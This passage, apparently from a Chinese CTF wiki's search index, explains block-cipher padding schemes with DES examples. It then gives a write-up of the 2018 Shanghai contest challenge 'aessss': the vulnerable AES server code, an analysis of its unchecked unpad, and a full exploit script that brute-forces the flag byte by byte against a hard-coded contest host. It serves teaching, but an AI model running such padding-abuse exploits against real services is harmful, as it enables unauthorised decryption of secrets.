OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25 2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b aessss \u00b6 \u6709\u65f6\u5019\u53ef\u4ee5\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e0d\u5f53\u7684 Padding \u8fdb\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u4ee5 2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7684\u4e00\u9053\u9898\u76ee\u4e3a\u4f8b\uff1a \u9898\u76ee\u811a\u672c\u5982\u4e0b\uff1a import random import sys import string from hashlib import sha256 import SocketServer from Crypto.Cipher import AES from secret import FLAG , IV , KEY class Task ( SocketServer . BaseRequestHandler ): def proof_of_work ( self ): proof = '' . join ( [ random . choice ( string . ascii_letters + string . digits ) for _ in xrange ( 20 )]) # print proof digest = sha256 ( proof ) . hexdigest () self . request . send ( \"sha256(XXXX+ %s ) == %s \\n \" % ( proof [ 4 :], digest )) self . request . send ( 'Give me XXXX:' ) x = self . request . recv ( 10 ) x = x . strip () if len ( x ) != 4 or sha256 ( x + proof [ 4 :]) . hexdigest () != digest : return False return True def pad ( self , s ): s += ( 256 - len ( s )) * chr ( 256 - len ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return '' . join ( ret [ 0 : - ord ( ret [ - 1 ])]) s_box = [ 0x63 , 0x7C , 0x77 , 0x7B , 0xF2 , 0x6B , 0x6F , 0xC5 , 0x30 , 0x01 , 0x67 , 0x2B , 0xFE , 0xD7 , 0xAB , 0x76 , 0xCA , 0x82 , 0xC9 , 0x7D , 0xFA , 0x59 , 0x47 , 0xF0 , 0xAD , 0xD4 , 0xA2 , 0xAF , 0x9C , 0xA4 , 0x72 , 0xC0 , 0xB7 , 0xFD , 0x93 , 0x26 , 0x36 , 0x3F , 0xF7 , 0xCC , 0x34 , 0xA5 , 0xE5 , 0xF1 , 0x71 , 0xD8 , 0x31 , 0x15 , 0x04 , 0xC7 , 0x23 , 0xC3 , 0x18 , 0x96 , 0x05 , 0x9A , 0x07 , 0x12 , 0x80 , 0xE2 , 0xEB , 0x27 , 0xB2 , 0x75 , 0x09 , 0x83 , 0x2C , 0x1A , 0x1B , 0x6E , 0x5A , 0xA0 , 0x52 , 0x3B , 0xD6 , 0xB3 , 0x29 , 0xE3 , 0x2F , 0x84 , 0x53 , 0xD1 , 0x00 , 0xED , 0x20 , 0xFC , 0xB1 , 0x5B , 0x6A , 0xCB , 0xBE , 0x39 , 0x4A , 0x4C , 0x58 , 0xCF , 0xD0 , 0xEF , 0xAA , 0xFB , 0x43 , 0x4D , 0x33 , 0x85 , 0x45 , 0xF9 , 0x02 , 0x7F , 0x50 , 0x3C , 0x9F , 0xA8 , 0x51 , 0xA3 , 0x40 , 0x8F , 0x92 , 0x9D , 0x38 , 0xF5 , 0xBC , 0xB6 , 0xDA , 0x21 , 0x10 , 0xFF , 0xF3 , 0xD2 , 0xCD , 0x0C , 0x13 , 0xEC , 0x5F , 0x97 , 0x44 , 0x17 , 0xC4 , 0xA7 , 0x7E , 0x3D , 0x64 , 0x5D , 0x19 , 0x73 , 0x60 , 0x81 , 0x4F , 0xDC , 0x22 , 0x2A , 0x90 , 0x88 , 0x46 , 0xEE , 0xB8 , 0x14 , 0xDE , 0x5E , 0x0B , 0xDB , 0xE0 , 0x32 , 0x3A , 0x0A , 0x49 , 0x06 , 0x24 , 0x5C , 0xC2 , 0xD3 , 0xAC , 0x62 , 0x91 , 0x95 , 0xE4 , 0x79 , 0xE7 , 0xC8 , 0x37 , 0x6D , 0x8D , 0xD5 , 0x4E , 0xA9 , 0x6C , 0x56 , 0xF4 , 0xEA , 0x65 , 0x7A , 0xAE , 0x08 , 0xBA , 0x78 , 0x25 , 0x2E , 0x1C , 0xA6 , 0xB4 , 0xC6 , 0xE8 , 0xDD , 0x74 , 0x1F , 0x4B , 0xBD , 0x8B , 0x8A , 0x70 , 0x3E , 0xB5 , 0x66 , 0x48 , 0x03 , 0xF6 , 0x0E , 0x61 , 0x35 , 0x57 , 0xB9 , 0x86 , 0xC1 , 0x1D , 0x9E , 0xE1 , 0xF8 , 0x98 , 0x11 , 0x69 , 0xD9 , 0x8E , 0x94 , 0x9B , 0x1E , 0x87 , 0xE9 , 0xCE , 0x55 , 0x28 , 0xDF , 0x8C , 0xA1 , 0x89 , 0x0D , 0xBF , 0xE6 , 0x42 , 0x68 , 0x41 , 0x99 , 0x2D , 0x0F , 0xB0 , 0x54 , 0xBB , 0x16 ] invs_box = [ 0x52 , 0x09 , 0x6A , 0xD5 , 0x30 , 0x36 , 0xA5 , 0x38 , 0xBF , 0x40 , 0xA3 , 0x9E , 0x81 , 0xF3 , 0xD7 , 0xFB , 0x7C , 0xE3 , 0x39 , 0x82 , 0x9B , 0x2F , 0xFF , 0x87 , 0x34 , 0x8E , 0x43 , 0x44 , 0xC4 , 0xDE , 0xE9 , 0xCB , 0x54 , 0x7B , 0x94 , 0x32 , 0xA6 , 0xC2 , 0x23 , 0x3D , 0xEE , 0x4C , 0x95 , 0x0B , 0x42 , 0xFA , 0xC3 , 0x4E , 0x08 , 0x2E , 0xA1 , 0x66 , 0x28 , 0xD9 , 0x24 , 0xB2 , 0x76 , 0x5B , 0xA2 , 0x49 , 0x6D , 0x8B , 0xD1 , 0x25 , 0x72 , 0xF8 , 0xF6 , 0x64 , 0x86 , 0x68 , 0x98 , 0x16 , 0xD4 , 0xA4 , 0x5C , 0xCC , 0x5D , 0x65 , 0xB6 , 0x92 , 0x6C , 0x70 , 0x48 , 0x50 , 0xFD , 0xED , 0xB9 , 0xDA , 0x5E , 0x15 , 0x46 , 0x57 , 0xA7 , 0x8D , 0x9D , 0x84 , 0x90 , 0xD8 , 0xAB , 0x00 , 0x8C , 0xBC , 0xD3 , 0x0A , 0xF7 , 0xE4 , 0x58 , 0x05 , 0xB8 , 0xB3 , 0x45 , 0x06 , 0xD0 , 0x2C , 0x1E , 0x8F , 0xCA , 0x3F , 0x0F , 0x02 , 0xC1 , 0xAF , 0xBD , 0x03 , 0x01 , 0x13 , 0x8A , 0x6B , 0x3A , 0x91 , 0x11 , 0x41 , 0x4F , 0x67 , 0xDC , 0xEA , 0x97 , 0xF2 , 0xCF , 0xCE , 0xF0 , 0xB4 , 0xE6 , 0x73 , 0x96 , 0xAC , 0x74 , 0x22 , 0xE7 , 0xAD , 0x35 , 0x85 , 0xE2 , 0xF9 , 0x37 , 0xE8 , 0x1C , 0x75 , 0xDF , 0x6E , 0x47 , 0xF1 , 0x1A , 0x71 , 0x1D , 0x29 , 0xC5 , 0x89 , 0x6F , 0xB7 , 0x62 , 0x0E , 0xAA , 0x18 , 0xBE , 0x1B , 0xFC , 0x56 , 0x3E , 0x4B , 0xC6 , 0xD2 , 0x79 , 0x20 , 0x9A , 0xDB , 0xC0 , 0xFE , 0x78 , 0xCD , 0x5A , 0xF4 , 0x1F , 0xDD , 0xA8 , 0x33 , 0x88 , 0x07 , 0xC7 , 0x31 , 0xB1 , 0x12 , 0x10 , 0x59 , 0x27 , 0x80 , 0xEC , 0x5F , 0x60 , 0x51 , 0x7F , 0xA9 , 0x19 , 0xB5 , 0x4A , 0x0D , 0x2D , 0xE5 , 0x7A , 0x9F , 0x93 , 0xC9 , 0x9C , 0xEF , 0xA0 , 0xE0 , 0x3B , 0x4D , 0xAE , 0x2A , 0xF5 , 0xB0 , 0xC8 , 0xEB , 0xBB , 0x3C , 0x83 , 0x53 , 0x99 , 0x61 , 0x17 , 0x2B , 0x04 , 0x7E , 0xBA , 0x77 , 0xD6 , 0x26 , 0xE1 , 0x69 , 0x14 , 0x63 , 0x55 , 0x21 , 0x0C , 0x7D ] def encrypt ( self , msg ): cipher = AES . new ( KEY , AES . MODE_CBC , IV ) return cipher . encrypt ( msg ) . encode ( 'hex' ) def handle ( self ): if not self . proof_of_work (): return self . request . settimeout ( 15 ) req = self . request flag_len = len ( FLAG ) assert ( flag_len == 33 ) self . flag = self . pad ( FLAG ) assert ( len ( self . flag ) == 256 ) while True : req . sendall ( 'Welcome to AES(WXH) encrypt system. \\n 1. get encrypted flag. \\n 2. pad flag. \\n 3.Do some encrypt. \\n Your choice:' ) cmd = req . recv ( 2 ) . strip () try : cmd = int ( cmd ) except ValueError : cmd = 0 if cmd == 1 : enc = self . encrypt ( self . flag ) req . sendall ( 'Here is the encrypted flag: 0x %s \\n ' % enc ) elif cmd == 2 : req . sendall ( 'Pad me something:' ) self . flag = self . unpad ( self . flag )[ : flag_len ] + req . recv ( 1024 ) . strip () assert ( len ( self . flag ) <= 256 ) self . flag = self . pad ( self . flag ) req . sendall ( 'Done. \\n ' ) elif cmd == 3 : req . sendall ( 'What do you want to encrypt:' ) msg = self . pad ( req . recv ( 1024 ) . strip ()) assert ( len ( msg ) <= 256 ) enc = self . encrypt ( msg ) req . sendall ( 'Here is the encrypted message: 0x %s \\n ' % enc ) else : req . sendall ( 'Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!' ) req . close () return class ThreadedServer ( SocketServer . ThreadingMixIn , SocketServer . TCPServer ): pass if __name__ == \"__main__\" : HOST , PORT = '0.0.0.0' , 23333 print 'Run in port:23333' server = ThreadedServer (( HOST , PORT ), Task ) server . allow_reuse_address = True server . serve_forever () \u5206\u6790 \u00b6 \u8fd9\u4e2a\u9898\u76ee\u95ee\u9898\u51fa\u5728 padding \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e0d\u8db3 256 \u4f4d\u8981\u8fdb\u884c padding\uff0cpadding \u7684\u5b57\u8282\u4e5f\u5c31\u662f\u7f3a\u7684\u5b57\u8282\u6570\uff0c\u4f46\u662f\u5982\u679c\u660e\u6587\u591f 256 \u5b57\u8282\uff0c\u90a3\u4e48\u6309\u7167\u4ee3\u7801\u903b\u8f91\u5c31\u4e0d\u8fdb\u884c padding\uff1a def pad ( self , s ): s += ( 256 - len ( s )) * chr ( 256 - len ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) \u6700\u5927\u7684\u95ee\u9898\u51fa\u5728 unpad \u4e0a\uff0cunpad \u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff0c\u4ec5\u4ec5\u901a\u8fc7\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u586b\u5145\u7684\u5b57\u8282\u6570\u3002 def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return '' . join ( ret [ 0 : - ord ( ret [ - 1 ])]) \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7be1\u6539\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u63a7\u5236\u53bb\u6389\u7684 padding \u5b57\u8282\u6570\u3002 \u5229\u7528 \u00b6 \u9009\u62e9 choice2\uff0c\u8ffd\u52a0 256-33 =223 \u5b57\u8282\uff0c\u4f7f\u5f53\u524d flag \u4e0d\u9700\u8981\u586b\u5145\uff0c\u8ffd\u52a0\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u6210 chr(256-32) \u3002 \u670d\u52a1\u5668\u5bf9 flag \u8ffd\u52a0\u6211\u4eec\u7684\u4fe1\u606f\uff0c\u5e76\u8fdb\u884c s \u76d2\u66ff\u6362\uff0c\u7ed3\u679c\u8d4b\u7ed9\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u3002 \u6211\u4eec\u518d\u6b21\u9009\u62e9 choice2\uff0c\u8fd9\u91cc\u7531\u4e8e\u6211\u4eec\u9700\u8981\u8ffd\u52a0\uff0c\u670d\u52a1\u5668\u4f1a\u5c06\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u53d6\u51fa\u8fdb\u884c\u9006 S \u76d2\u66ff\u6362\u548c unpad\uff0c\u8fd9\u6837\u6309\u7167\u8fd9\u4e2a unpad \u7b97\u6cd5\u4f1a\u628a\u540e\u9762 224 \u5b57\u8282\u7684\u5168\u90e8\u5f53\u6210 padding\u53bb\u6389\uff0c\u660e\u6587\u5269\u4e0b\u4e86\u771f\u6b63 flag \u7684\u524d32\u4f4d\u3002 \u6211\u4eec\u6b64\u65f6\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26 i,\u90a3\u4e48\u6b64\u65f6\u52a0\u5bc6\u7684\u5bf9\u8c61\u5c31\u662f flag[:32]+i \u3002 \u9009\u62e9 choice1 \u5bf9\u5f53\u524d flag \u52a0\u5bc6\uff0c\u63a7\u5236 i \u8fdb\u884c\u7206\u7834\uff0c\u5982\u679c\u5f97\u5230\u7684\u5bc6\u6587\u548c\u6700\u521d\u7684 flag \u52a0\u5bc6\u7684\u5bc6\u6587\u4e00\u6837\uff0c\u5c31\u5f97\u5230\u4e86 flag \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u9010\u5b57\u8282\u7206\u7834\uff0c\u76f4\u81f3\u83b7\u53d6\u5168\u90e8\u7684 flag\u3002 exp \u5982\u4e0b\uff1a # -*- coding: utf-8 -*- from hashlib import sha256 import socket import string import itertools HOST = '106.75.13.64' PORT = 54321 sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( HOST , PORT )) def brute_force ( pad , shavalue ): for str in itertools . product ( string . ascii_letters + string . digits , repeat = 4 ): str = '' . join ( str ) if sha256 ( str + pad ) . hexdigest () == shavalue : print str return str def choice1 (): sock . send ( \"1 \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 30 :] sock . recv ( 1024 ) . strip () return result def choice2 ( pad ): sock . send ( \"2 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( pad + \" \\n \" ) sock . recv ( 1024 ) . strip () sock . recv ( 1024 ) . strip () def choice3 ( str ): sock . send ( \"3 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( str + \" \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 33 :] sock . recv ( 1024 ) . strip () return result content = sock . recv ( 1024 ) . strip () pad = content [ 12 : 12 + 16 ] hash = content [ 33 : 33 + 64 ] sock . recv ( 1024 ) . strip () sock . send ( str ( brute_force ( pad , hash )) + \" \\n \" ) print sock . recv ( 1024 ) . strip () flag_enc = choice1 () flag = \"\" for i in range ( 33 ): a = '' . join ([ 'a' for _ in range ( 223 )]) a = a [: - 1 ] + chr ( 224 + i ) for c in string . printable : print c + flag choice2 ( a ) choice2 ( c + flag ) if choice1 () == flag_enc : flag = c + flag print \"success:\" , flag break flag{H4ve_fun_w1th_p4d_and_unp4d}","title":"\u586b\u5145\u65b9\u5f0f"},{"location":"crypto/blockcipher/mode/padding/#_1","text":"\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002 \u5e38\u89c1\u7684 \u586b\u5145\u89c4\u5219 \u5982\u4e0b\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002","title":"\u586b\u5145\u65b9\u5f0f"},{"location":"crypto/blockcipher/mode/padding/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40","title":"Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)"},{"location":"crypto/blockcipher/mode/padding/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 \u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002","title":"Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8","title":"Pad with zeroes except make the last byte equal to the number of padding bytes"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zero-null-characters","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75","title":"Pad with zero (null) characters"},{"location":"crypto/blockcipher/mode/padding/#pad-with-spaces","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25","title":"Pad with spaces"},{"location":"crypto/blockcipher/mode/padding/#2018-aessss","text":"\u6709\u65f6\u5019\u53ef\u4ee5\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e0d\u5f53\u7684 Padding \u8fdb\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u4ee5 2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7684\u4e00\u9053\u9898\u76ee\u4e3a\u4f8b\uff1a \u9898\u76ee\u811a\u672c\u5982\u4e0b\uff1a import random import sys import string from hashlib import sha256 import SocketServer from Crypto.Cipher import AES from secret import FLAG , IV , KEY class Task ( SocketServer . BaseRequestHandler ): def proof_of_work ( self ): proof = '' . join ( [ random . choice ( string . ascii_letters + string . digits ) for _ in xrange ( 20 )]) # print proof digest = sha256 ( proof ) . hexdigest () self . request . send ( \"sha256(XXXX+ %s ) == %s \\n \" % ( proof [ 4 :], digest )) self . request . send ( 'Give me XXXX:' ) x = self . request . recv ( 10 ) x = x . strip () if len ( x ) != 4 or sha256 ( x + proof [ 4 :]) . hexdigest () != digest : return False return True def pad ( self , s ): s += ( 256 - len ( s )) * chr ( 256 - len ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return '' . join ( ret [ 0 : - ord ( ret [ - 1 ])]) s_box = [ 0x63 , 0x7C , 0x77 , 0x7B , 0xF2 , 0x6B , 0x6F , 0xC5 , 0x30 , 0x01 , 0x67 , 0x2B , 0xFE , 0xD7 , 0xAB , 0x76 , 0xCA , 0x82 , 0xC9 , 0x7D , 0xFA , 0x59 , 0x47 , 0xF0 , 0xAD , 0xD4 , 0xA2 , 0xAF , 0x9C , 0xA4 , 0x72 , 0xC0 , 0xB7 , 0xFD , 0x93 , 0x26 , 0x36 , 0x3F , 0xF7 , 0xCC , 0x34 , 0xA5 , 0xE5 , 0xF1 , 0x71 , 0xD8 , 0x31 , 0x15 , 0x04 , 0xC7 , 0x23 , 0xC3 , 0x18 , 0x96 , 0x05 , 0x9A , 0x07 , 0x12 , 0x80 , 0xE2 , 0xEB , 0x27 , 0xB2 , 0x75 , 0x09 , 0x83 , 0x2C , 0x1A , 0x1B , 0x6E , 0x5A , 0xA0 , 0x52 , 0x3B , 0xD6 , 0xB3 , 0x29 , 0xE3 , 0x2F , 0x84 , 0x53 , 0xD1 , 0x00 , 0xED , 0x20 , 0xFC , 0xB1 , 0x5B , 0x6A , 0xCB , 0xBE , 0x39 , 0x4A , 0x4C , 0x58 , 0xCF , 0xD0 , 0xEF , 0xAA , 0xFB , 0x43 , 0x4D , 0x33 , 0x85 , 0x45 , 0xF9 , 0x02 , 0x7F , 0x50 , 0x3C , 0x9F , 0xA8 , 0x51 , 0xA3 , 0x40 , 0x8F , 0x92 , 0x9D , 0x38 , 0xF5 , 0xBC , 0xB6 , 0xDA , 0x21 , 0x10 , 0xFF , 0xF3 , 0xD2 , 0xCD , 0x0C , 0x13 , 0xEC , 0x5F , 0x97 , 0x44 , 0x17 , 0xC4 , 0xA7 , 0x7E , 0x3D , 0x64 , 0x5D , 0x19 , 0x73 , 0x60 , 0x81 , 0x4F , 0xDC , 0x22 , 0x2A , 0x90 , 0x88 , 0x46 , 0xEE , 0xB8 , 0x14 , 0xDE , 0x5E , 0x0B , 0xDB , 0xE0 , 0x32 , 0x3A , 0x0A , 0x49 , 0x06 , 0x24 , 0x5C , 0xC2 , 0xD3 , 0xAC , 0x62 , 0x91 , 0x95 , 0xE4 , 0x79 , 0xE7 , 0xC8 , 0x37 , 0x6D , 0x8D , 0xD5 , 0x4E , 0xA9 , 0x6C , 0x56 , 0xF4 , 0xEA , 0x65 , 0x7A , 0xAE , 0x08 , 0xBA , 0x78 , 0x25 , 0x2E , 0x1C , 0xA6 , 0xB4 , 0xC6 , 0xE8 , 0xDD , 0x74 , 0x1F , 0x4B , 0xBD , 0x8B , 0x8A , 0x70 , 0x3E , 0xB5 , 0x66 , 0x48 , 0x03 , 0xF6 , 0x0E , 0x61 , 0x35 , 0x57 , 0xB9 , 0x86 , 0xC1 , 0x1D , 0x9E , 0xE1 , 0xF8 , 0x98 , 0x11 , 0x69 , 0xD9 , 0x8E , 0x94 , 0x9B , 0x1E , 0x87 , 0xE9 , 0xCE , 0x55 , 0x28 , 0xDF , 0x8C , 0xA1 , 0x89 , 0x0D , 0xBF , 0xE6 , 0x42 , 0x68 , 0x41 , 0x99 , 0x2D , 0x0F , 0xB0 , 0x54 , 0xBB , 0x16 ] invs_box = [ 0x52 , 0x09 , 0x6A , 0xD5 , 0x30 , 0x36 , 0xA5 , 0x38 , 0xBF , 0x40 , 0xA3 , 0x9E , 0x81 , 0xF3 , 0xD7 , 0xFB , 0x7C , 0xE3 , 0x39 , 0x82 , 0x9B , 0x2F , 0xFF , 0x87 , 0x34 , 0x8E , 0x43 , 0x44 , 0xC4 , 0xDE , 0xE9 , 0xCB , 0x54 , 0x7B , 0x94 , 0x32 , 0xA6 , 0xC2 , 0x23 , 0x3D , 0xEE , 0x4C , 0x95 , 0x0B , 0x42 , 0xFA , 0xC3 , 0x4E , 0x08 , 0x2E , 0xA1 , 0x66 , 0x28 , 0xD9 , 0x24 , 0xB2 , 0x76 , 0x5B , 0xA2 , 0x49 , 0x6D , 0x8B , 0xD1 , 0x25 , 0x72 , 0xF8 , 0xF6 , 0x64 , 0x86 , 0x68 , 0x98 , 0x16 , 0xD4 , 0xA4 , 0x5C , 0xCC , 0x5D , 0x65 , 0xB6 , 0x92 , 0x6C , 0x70 , 0x48 , 0x50 , 0xFD , 0xED , 0xB9 , 0xDA , 0x5E , 0x15 , 0x46 , 0x57 , 0xA7 , 0x8D , 0x9D , 0x84 , 0x90 , 0xD8 , 0xAB , 0x00 , 0x8C , 0xBC , 0xD3 , 0x0A , 0xF7 , 0xE4 , 0x58 , 0x05 , 0xB8 , 0xB3 , 0x45 , 0x06 , 0xD0 , 0x2C , 0x1E , 0x8F , 0xCA , 0x3F , 0x0F , 0x02 , 0xC1 , 0xAF , 0xBD , 0x03 , 0x01 , 0x13 , 0x8A , 0x6B , 0x3A , 0x91 , 0x11 , 0x41 , 0x4F , 0x67 , 0xDC , 0xEA , 0x97 , 0xF2 , 0xCF , 0xCE , 0xF0 , 0xB4 , 0xE6 , 0x73 , 0x96 , 0xAC , 0x74 , 0x22 , 0xE7 , 0xAD , 0x35 , 0x85 , 0xE2 , 0xF9 , 0x37 , 0xE8 , 0x1C , 0x75 , 0xDF , 0x6E , 0x47 , 0xF1 , 0x1A , 0x71 , 0x1D , 0x29 , 0xC5 , 0x89 , 0x6F , 0xB7 , 0x62 , 0x0E , 0xAA , 0x18 , 0xBE , 0x1B , 0xFC , 0x56 , 0x3E , 0x4B , 0xC6 , 0xD2 , 0x79 , 0x20 , 0x9A , 0xDB , 0xC0 , 0xFE , 0x78 , 0xCD , 0x5A , 0xF4 , 0x1F , 0xDD , 0xA8 , 0x33 , 0x88 , 0x07 , 0xC7 , 0x31 , 0xB1 , 0x12 , 0x10 , 0x59 , 0x27 , 0x80 , 0xEC , 0x5F , 0x60 , 0x51 , 0x7F , 0xA9 , 0x19 , 0xB5 , 0x4A , 0x0D , 0x2D , 0xE5 , 0x7A , 0x9F , 0x93 , 0xC9 , 0x9C , 0xEF , 0xA0 , 0xE0 , 0x3B , 0x4D , 0xAE , 0x2A , 0xF5 , 0xB0 , 0xC8 , 0xEB , 0xBB , 0x3C , 0x83 , 0x53 , 0x99 , 0x61 , 0x17 , 0x2B , 0x04 , 0x7E , 0xBA , 0x77 , 0xD6 , 0x26 , 0xE1 , 0x69 , 0x14 , 0x63 , 0x55 , 0x21 , 0x0C , 0x7D ] def encrypt ( self , msg ): cipher = AES . new ( KEY , AES . MODE_CBC , IV ) return cipher . encrypt ( msg ) . encode ( 'hex' ) def handle ( self ): if not self . proof_of_work (): return self . request . settimeout ( 15 ) req = self . request flag_len = len ( FLAG ) assert ( flag_len == 33 ) self . flag = self . pad ( FLAG ) assert ( len ( self . flag ) == 256 ) while True : req . sendall ( 'Welcome to AES(WXH) encrypt system. \\n 1. get encrypted flag. \\n 2. pad flag. \\n 3.Do some encrypt. \\n Your choice:' ) cmd = req . recv ( 2 ) . strip () try : cmd = int ( cmd ) except ValueError : cmd = 0 if cmd == 1 : enc = self . encrypt ( self . flag ) req . sendall ( 'Here is the encrypted flag: 0x %s \\n ' % enc ) elif cmd == 2 : req . sendall ( 'Pad me something:' ) self . flag = self . unpad ( self . flag )[ : flag_len ] + req . recv ( 1024 ) . strip () assert ( len ( self . flag ) <= 256 ) self . flag = self . pad ( self . flag ) req . sendall ( 'Done. \\n ' ) elif cmd == 3 : req . sendall ( 'What do you want to encrypt:' ) msg = self . pad ( req . recv ( 1024 ) . strip ()) assert ( len ( msg ) <= 256 ) enc = self . encrypt ( msg ) req . sendall ( 'Here is the encrypted message: 0x %s \\n ' % enc ) else : req . sendall ( 'Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!' ) req . close () return class ThreadedServer ( SocketServer . ThreadingMixIn , SocketServer . TCPServer ): pass if __name__ == \"__main__\" : HOST , PORT = '0.0.0.0' , 23333 print 'Run in port:23333' server = ThreadedServer (( HOST , PORT ), Task ) server . allow_reuse_address = True server . serve_forever ()","title":"2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b aessss"},{"location":"crypto/blockcipher/mode/padding/#_2","text":"\u8fd9\u4e2a\u9898\u76ee\u95ee\u9898\u51fa\u5728 padding \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e0d\u8db3 256 \u4f4d\u8981\u8fdb\u884c padding\uff0cpadding \u7684\u5b57\u8282\u4e5f\u5c31\u662f\u7f3a\u7684\u5b57\u8282\u6570\uff0c\u4f46\u662f\u5982\u679c\u660e\u6587\u591f 256 \u5b57\u8282\uff0c\u90a3\u4e48\u6309\u7167\u4ee3\u7801\u903b\u8f91\u5c31\u4e0d\u8fdb\u884c padding\uff1a def pad ( self , s ): s += ( 256 - len ( s )) * chr ( 256 - len ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) \u6700\u5927\u7684\u95ee\u9898\u51fa\u5728 unpad \u4e0a\uff0cunpad \u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\uff0c\u4ec5\u4ec5\u901a\u8fc7\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u586b\u5145\u7684\u5b57\u8282\u6570\u3002 def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return '' . join ( ret [ 0 : - ord ( ret [ - 1 ])]) 